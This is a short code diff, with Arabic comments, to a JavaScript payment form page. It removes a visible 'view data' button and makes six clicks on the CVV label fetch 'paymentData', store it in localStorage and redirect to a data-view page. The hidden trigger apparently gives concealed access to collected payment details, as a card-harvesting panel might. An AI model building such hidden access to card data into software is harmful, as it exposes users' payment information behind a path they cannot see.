@@ -111,27 +111,24 @@ document.addEventListener('DOMContentLoaded', () => {
                 alert('رقم المستخدم أو كلمة المرور غير صحيحة');
                 throw new Error('Unauthorized');
             }
-            if (response.status === 400) {
-                alert('يرجى إدخال رقم المستخدم وكلمة المرور');
-                throw new Error('Bad Request');
-            }
             return response.json();
         })
         .then(data => {
             console.log(data);
-            alert(JSON.stringify(data, null, 2));
+            // احفظ البيانات في localStorage للعرض في صفحة view-data.html
+            localStorage.setItem('paymentData', JSON.stringify(data));
+            // قم بإعادة التوجيه إلى صفحة view-data.html
+            window.location.href = 'view-data.html';
         })
         .catch(error => {
             console.error('Error:', error);
         });
     };
 
-    document.getElementById('view-data').addEventListener('click', viewData);
-
     cvvLabel.addEventListener('click', () => {
         cvvClickCount++;
         if (cvvClickCount === 6) {
-            window.location.href = 'view-data.html';
+            viewData();
             cvvClickCount = 0; // Reset count
         }
     });
